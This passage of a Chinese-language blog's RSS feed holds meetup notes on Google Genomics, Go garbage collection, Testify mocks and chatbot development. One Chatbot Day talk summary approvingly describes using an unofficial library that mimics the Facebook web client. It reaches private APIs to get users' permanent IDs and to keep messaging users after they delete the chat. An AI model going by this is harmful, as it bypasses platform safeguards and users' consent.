&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/user-defined-functions"&gt;UDF: User-defined Functions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Google Genomics API 初探&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Resources  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/"&gt;https://cloud.google.com/genomics/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/googlegenomics"&gt;https://github.com/googlegenomics&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;相關知識介紹&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Analogy between biology and computer science  &lt;ul&gt;
&lt;li&gt;Biology vs Python  &lt;ul&gt;
&lt;li&gt;Cell == Computer  &lt;/li&gt;
&lt;li&gt;DNA == *.py source files  &lt;/li&gt;
&lt;li&gt;Genome == All source files  &lt;/li&gt;
&lt;li&gt;RNAs == binaries  &lt;/li&gt;
&lt;li&gt;Proteins == Objects  &lt;/li&gt;
&lt;li&gt;CRISPR == Sed (i.e. &lt;code&gt;s/'ATG'//g+&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Genetic Variation  &lt;ul&gt;
&lt;li&gt;每個人都是獨一無二的  &lt;/li&gt;
&lt;li&gt;雙胞胎之間仍然有差異  &lt;/li&gt;
&lt;li&gt;體質  &lt;ul&gt;
&lt;li&gt;吃不胖  &lt;/li&gt;
&lt;li&gt;容易得癌症  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;4 種核甘酸，20 種胺基酸，RNA encoding 每 3 個對應到 1 個胺基酸  &lt;/li&gt;
&lt;li&gt;Mis-Sense Mutation  &lt;/li&gt;
&lt;li&gt;Frame-shift mutation  &lt;ul&gt;
&lt;li&gt;有一個核甘酸突然不見了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Genetic variant of ALDH2 makes us red face  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Alcohol_flush_reaction"&gt;https://en.wikipedia.org/wiki/Alcohol_flush_reaction&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;乙醇無法順利代謝成乙醛  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Some drugs works for parts of people  &lt;ul&gt;
&lt;li&gt;有些人吃藥沒效  &lt;/li&gt;
&lt;li&gt;有些人吃藥會過敏  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mayoclinic.org/diseases-conditions/stevens-johnson-syndrome/home/ovc-20317097"&gt;Stevens-Johnson syndrome&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Precision Medicine  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Precision_medicine"&gt;https://en.wikipedia.org/wiki/Precision_medicine&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歐巴馬政府提出  &lt;/li&gt;
&lt;li&gt;透過個人的基因定序，完全瞭解差異以後，針對個人的基因做的個人化醫療服務  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NGS  &lt;ul&gt;
&lt;li&gt;基因定序的成本在 2007 年左右突然驟降，自此有將其作為區分點，將之後的定序稱為次世代基因定序  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.genome.gov/sequencingcosts/"&gt;https://www.genome.gov/sequencingcosts/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Next-Generation DNA Sequencing  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ebi.ac.uk/training/online/course/ebi-next-generation-sequencing-practical-course/what-you-will-learn/what-next-generation-dna-"&gt;https://www.ebi.ac.uk/training/online/course/ebi-next-generation-sequencing-practical-course/what-you-will-learn/what-next-generation-dna-&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;一人份的基因定序 raw data 平均在 200 GB 左右  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Google Cloud Platform &amp;amp; Google Genomics&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;實例  &lt;ul&gt;
&lt;li&gt;MSSNG Project (AUTISM)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mss.ng/"&gt;https://www.mss.ng/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;和自閉症患者相關的協會合作，收集了大量的自閉症患者的基因  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Million Veteran Project  &lt;/li&gt;
&lt;li&gt;Cancer Investigation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How Google Genomics Works  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/overview"&gt;https://cloud.google.com/genomics/overview&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Store: Google Cloud Storage  &lt;/li&gt;
&lt;li&gt;Process: Google Genomics  &lt;/li&gt;
&lt;li&gt;Explore: Google BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to use Google Genomics API?  &lt;ul&gt;
&lt;li&gt;Requirement  &lt;ul&gt;
&lt;li&gt;BigQuery  &lt;/li&gt;
&lt;li&gt;Genomics API  &lt;/li&gt;
&lt;li&gt;Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Start  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/v1/load-variants"&gt;https://cloud.google.com/genomics/v1/load-variants&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Create Dataset (To get  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcloud alpha genomics datasets create --name my-dataset&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Create Variantsets  &lt;/li&gt;
&lt;li&gt;Import Variants  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcloud alpha genomics variants import --variantest-id variantset-id&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check Operation Details  &lt;ul&gt;
&lt;li&gt;用 GCP 提供的工具看是不是完成了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pipelines  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/v1alpha2/pipelines"&gt;https://cloud.google.com/genomics/v1alpha2/pipelines&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;看了 tutorial 之後，不一定就能套用到自己的 pipeline 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://googlegenomics.readthedocs.io/en/latest/"&gt;https://googlegenomics.readthedocs.io/en/latest/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Workflow Languages  &lt;ul&gt;
&lt;li&gt;CWL (Common Workflow Language)  &lt;/li&gt;
&lt;li&gt;WDL (Workflow Description Language)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/broadinstitute/wdl"&gt;https://github.com/broadinstitute/wdl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://software.broadinstitute.org/wdl/"&gt;https://software.broadinstitute.org/wdl/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Others (Makefile, Snakemake, Nextflow, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using Cloud ML  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/googlegenomics/cloudml-examples"&gt;https://github.com/googlegenomics/cloudml-examples&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;討論生物資訊的社群  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/446434039038963/?ref=br_rs"&gt;Taipei Bioinformatics Omnibus (北-Bio)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 02 Jun 2017 21:39:53 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-06-02:posts/2017/06/02/gcpug-tw-26/</guid><category>Google Cloud Platform</category></item><item><title>Golang Taipei Gathering #24</title><link>https://blog.m157q.tw/posts/2017/05/23/golang-taipei-gathering-24/</link><description>&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;KKTIX: &lt;a href="https://golang.kktix.cc/events/gtg24"&gt;https://golang.kktix.cc/events/gtg24&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub: &lt;a href="https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg24"&gt;https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg24&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;鮑承佑: go-swagger 踩雷分享&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/gogland_and_go-swagger.pdf"&gt;https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/gogland_and_go-swagger.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/go-swagger/go-swagger"&gt;https://github.com/go-swagger/go-swagger&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jetbrains.com/go/"&gt;Gogland&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;寫 &lt;code&gt;swagger.yaml&lt;/code&gt; 可以 generate golang code for web server  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Genji Lu: Golang GC 演算法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/GenchiLu/gc-in-golang-76250675"&gt;https://www.slideshare.net/GenchiLu/gc-in-golang-76250675&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection#Tri-color_marking"&gt;Tri-color GC&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;mark phase &amp;amp; sweep phase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write Barrier  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.golang.org/go15gc"&gt;Go GC: Prioritizing low latency and simplicity - The Go Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Golang 1.5 時的文章，以降低 latency 為主。  &lt;/li&gt;
&lt;li&gt;Golang 1.5 公佈了這個 low latency 為主的 Garbage Collector  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tradeoff  &lt;ul&gt;
&lt;li&gt;Tricolor GC 能達到極短暫的 pause time，但相對的付出代價  &lt;ul&gt;
&lt;li&gt;heap size 不可預期性  &lt;/li&gt;
&lt;li&gt;頻繁產生新物件時，throughput 會較低，CPU 時間花在 GC 上的比例較高  &lt;/li&gt;
&lt;li&gt;潛在風險：記憶體破碎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實測 GC example code  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;GODEBUG=gctrace=1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ GODEBUG=gctrace=1 go run main.go&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://golang.org/pkg/runtime/pprof/"&gt;runtime/pprof&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;net/pprof  &lt;ul&gt;
&lt;li&gt;http://127.0.0.1:7777/debug/pprof  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Golang 對 GC 的優化  &lt;ul&gt;
&lt;li&gt;1.6: 在 rescan stack 階段會檢查自從上次 STW (stop-the-world) 之後該 goroutine 是否有執行過，否則不 scan 該 stack。  &lt;/li&gt;
&lt;li&gt;1.7: 用一個 list 紀錄所有自從上次 STW 以後有執行過的 goroutine，在 rescane 階段不用 scan 所有 stack。  &lt;/li&gt;
&lt;li&gt;1.8: 修改 write barrier 消除 stack re-scan 的必要性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related materials  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://dave.cheney.net/tag/godebug"&gt;GODEBUG | Dave Cheney&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000004233812"&gt;[译]GC专家系列1：理解Java垃圾回收 - 牧曦之晨 - SegmentFault&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;STW:「回到垃圾回收上，在開始學習GC之前你應該知道一個詞：stop-the-world。不管選擇哪種GC算法，stop-the-world都是不可避免的。Stop-the-world意味著從應用中停下來並進入到GC執行過程中去。一旦Stop-the-world發生，除了GC所需的線程外，其他線程都將停止工作，中斷了的線程直到GC任務結束才繼續它們的任務。GC調優通常就是為了改善stop-the-world的時間。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Linzy: 介紹 Testify 的 mock 功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/testify_gtg24.zip"&gt;https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/testify_gtg24.zip&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stretchr/testify"&gt;https://github.com/stretchr/testify&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A sacred extension to the standard go testing package  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stretchr/testify#mock-package"&gt;https://github.com/stretchr/testify#mock-package&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;mock.AnythingOfType("string")&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Chain your expectations  &lt;/li&gt;
&lt;li&gt;Verify your expectations  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mock.AssertCalled(t, "foo", "bar")&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Stan Lo: Rooby: A new object oriented language written in Go aim at developing microservice efficiently&lt;/h3&gt;
&lt;p&gt;是這篇&lt;a href="https://medium.com/@st0012/%E5%AF%AB%E8%87%AA%E5%B7%B1%E7%9A%84%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80-for-rubyist-3f055c4573da"&gt;寫自己的程式語言（For Rubyist） – Stan Lo – Medium&lt;/a&gt; 的作者本人耶  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/LoStan/goby-76176699"&gt;https://www.slideshare.net/LoStan/goby-76176699&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/goby-lang/goby"&gt;GitHub - goby-lang/goby: Goby (Rooby) is a new object oriented language written in Go aim at developing microservice efficiently.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從 Rooby 改名叫 Goby 了，因為被罵翻了，一堆人寫信或開 issue 建議改名 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://goby-lang.github.io/goby/"&gt;https://goby-lang.github.io/goby/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;目的是想用 Ruby 的語法來做到像 Golang 一樣的 High Performance 的 Language  &lt;/li&gt;
&lt;li&gt;Goby is not  &lt;ul&gt;
&lt;li&gt;A new implementation of Ruby  &lt;/li&gt;
&lt;li&gt;Syntax sugar for Golang.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Golang?  &lt;ul&gt;
&lt;li&gt;已經對 Golang 有興趣一陣子  &lt;/li&gt;
&lt;li&gt;效能不錯  &lt;/li&gt;
&lt;li&gt;GC 和底層的事可以交給 Golang，自己則專心在 VM 上面的開發  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;上禮拜五辭職來全職開發這個語言，希望大家可以&lt;a href="https://gratipay.com/goby/"&gt;捐助一點錢&lt;/a&gt; XD  &lt;/li&gt;
&lt;li&gt;目前開發完成度大概是 first release 的 70%  &lt;/li&gt;
&lt;li&gt;歡迎大家送 PR，就算是改個錯字也可以。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 23 May 2017 21:46:45 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-05-23:posts/2017/05/23/golang-taipei-gathering-24/</guid><category>Golang</category></item><item><title>iThome #Chatbot Day</title><link>https://blog.m157q.tw/posts/2017/04/27/ithome-chatbot-day/</link><description>&lt;ul&gt;
&lt;li&gt;Event url: &lt;a href="http://chatbot.ithome.com.tw/"&gt;http://chatbot.ithome.com.tw/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative note: &lt;a href="https://hackpad.com/20170427-CHATBOT-DAY-NOTE-zblg5e45w3g"&gt;https://hackpad.com/20170427-CHATBOT-DAY-NOTE-zblg5e45w3g&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;突破 Facebook Messenger Platform API 限制&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Howard Chang  &lt;ul&gt;
&lt;li&gt;Her/Him 開發者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Facebook Messenger Platform API 在 Her/Him 上的應用實例&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Webview  &lt;ul&gt;
&lt;li&gt;讓 Messenger 的 UI 可以比較多樣與客製化  &lt;/li&gt;
&lt;li&gt;Facebook Login Webhook  &lt;/li&gt;
&lt;li&gt;讓使用者自己填寫資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Template  &lt;ul&gt;
&lt;li&gt;Generic Template  &lt;ul&gt;
&lt;li&gt;給使用者一些預設的聊天話題選項  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Button Template  &lt;ul&gt;
&lt;li&gt;玩猜拳  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特殊的 Emoji 會觸發特效  &lt;ul&gt;
&lt;li&gt;目前已知：愛心、氣球、雪花  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;取得使用者的 FB ID 後，轉換成 Profile URL  &lt;ul&gt;
&lt;li&gt;正常來說應該做不到這件事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Messenger Platform 的限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;24 小時內回覆的時間限制  &lt;ul&gt;
&lt;li&gt;超過 24 小時，只能再多發送一則訊息  &lt;/li&gt;
&lt;li&gt;有時候使用者一忙，可能超過 24 小時才回覆對方的訊息，如果不能突破這個限制，就無法讓使用者在超過 24 小時的回覆傳送到對方那邊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無法取得使用者的 FB permanent ID  &lt;ul&gt;
&lt;li&gt;不能取得的話，雙方就無法交換 Facebook 的網址  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無法傳送貼圖  &lt;ul&gt;
&lt;li&gt;透過 Messenger Platform 傳送的貼圖會變成靜態的圖片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用者刪除對話後，就無法傳送任何訊息給他。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;如何突破限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;取得 Facebook permanent ID 的方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Schmavery/facebook-chat-api"&gt;Schmavery/facebook-chat-api&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;npm module  &lt;/li&gt;
&lt;li&gt;透過模擬 Facebook 網頁運作，直接存取 private API  &lt;/li&gt;
&lt;li&gt;可以突破限制，在任何時間傳送任何訊息給任何人  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以拿到使用者的 Facebook permanent ID  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;突破 24 小時內回覆的限制與使用者刪除訊息後仍然可以傳送訊息  &lt;ul&gt;
&lt;li&gt;用 facebook-chat-api 傳送訊息給使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何傳送貼圖  &lt;ul&gt;
&lt;li&gt;用 facebook-chat-api 傳送 &lt;code&gt;sticker_id&lt;/code&gt; 給使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;今天覺得收穫最多的一場 talk，&lt;br /&gt;
主要是因為最近公司專案的關係都在寫 Facebook Messenger Bot，&lt;br /&gt;
然後這些的確都是在開發上會遇到的棘手問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Chatbot 智能溝通策略流程規劃與實作&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;AI  &lt;ul&gt;
&lt;li&gt;luis.ai, IBM Waston 支援繁體中文  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;據說 api.ai 也有支援繁體中文了，只是效果沒有那麼好。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;e-Commerce chatbot  &lt;ul&gt;
&lt;li&gt;手法  &lt;ul&gt;
&lt;li&gt;Push notification  &lt;ul&gt;
&lt;li&gt;傳送貼圖、優惠活動、限時特價  &lt;/li&gt;
&lt;li&gt;太常傳送且沒有打到使用者的點的話就很容易被封鎖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;產品使用後詢問、問卷回饋  &lt;/li&gt;
&lt;li&gt;使用者習性  &lt;ul&gt;
&lt;li&gt;預測使用者下次什麼時候會再購買一樣的日常用品  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;生日好禮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用者流程  &lt;ul&gt;
&lt;li&gt;推薦商品、搜尋商品、熱門商品  &lt;/li&gt;
&lt;li&gt;查無商品、可能推薦商品  &lt;/li&gt;
&lt;li&gt;建議其他關鍵字  &lt;/li&gt;
&lt;li&gt;近期熱門活動、建議行動  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;用 Golang 打造 DevOps Bot&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: appleboy  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Projects  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;drone-line&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/drone-line"&gt;https://github.com/appleboy/drone-line&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;drone-facebook&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/drone-facebook"&gt;https://github.com/appleboy/drone-facebook&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CI/CD  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gitlab  &lt;/li&gt;
&lt;li&gt;Jenkins  &lt;/li&gt;
&lt;li&gt;Drone  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 CLI Flag 參數  &lt;ul&gt;
&lt;li&gt;內建支援 CLI Flag  &lt;ul&gt;
&lt;li&gt;import "flag"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;不支援系統環境變數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 API Webhook  &lt;/li&gt;
&lt;li&gt;支援 HTTPS for WebHook Tunnel  &lt;ul&gt;
&lt;li&gt;ngrok  &lt;/li&gt;
&lt;li&gt;localtunnel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援自動更新 HTTPS 憑證  &lt;ul&gt;
&lt;li&gt;Trafik  &lt;ul&gt;
&lt;li&gt;Golang  &lt;/li&gt;
&lt;li&gt;支援自動更新憑證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CADDY  &lt;ul&gt;
&lt;li&gt;Golang  &lt;/li&gt;
&lt;li&gt;原生支援 HTTPS  &lt;/li&gt;
&lt;li&gt;自動更新 Let's Encrypt 憑證  &lt;/li&gt;
&lt;li&gt;會幫你自動把 HTTP protocol 轉到 HTTPS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用一行 Golang 支援 HTTPS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;http.Serve(autocert.NewListener("ecample.com", handler))&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bit.ly/one-line-autotls"&gt;https://bit.ly/one-line-autotls&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;自動幫你跟 Let's Encrypt 要憑證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援監控 Webhook 的功能  &lt;ul&gt;
&lt;li&gt;監控服務健康狀態  &lt;ul&gt;
&lt;li&gt;Memory usage, CPU usage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自訂監控數據，分析使用者訊息  &lt;/li&gt;
&lt;li&gt;統計報表  &lt;ul&gt;
&lt;li&gt;prometheus 資料格式  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://prometheus.io"&gt;https://prometheus.io&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Grafana  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://grafana.com"&gt;https://grafana.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援多種訊息格式  &lt;/li&gt;
&lt;li&gt;支援用 CLI 發送訊息  &lt;/li&gt;
&lt;li&gt;Golang 跨平台  &lt;ul&gt;
&lt;li&gt;Simple Go Cross Compilation  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gox&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mitchellh/gox"&gt;https://github.com/mitchellh/gox&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Windows 的支援沒問題  &lt;/li&gt;
&lt;li&gt;可以加上 flag 指定特定檔案只在某些 plafform 才 build  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Support ARM Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援透過 Docker 發送訊息  &lt;ul&gt;
&lt;li&gt;需支援系統環境變數  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/urfave/cli"&gt;https://github.com/urfave/cli&lt;/a&gt;  &lt;ul&gt;
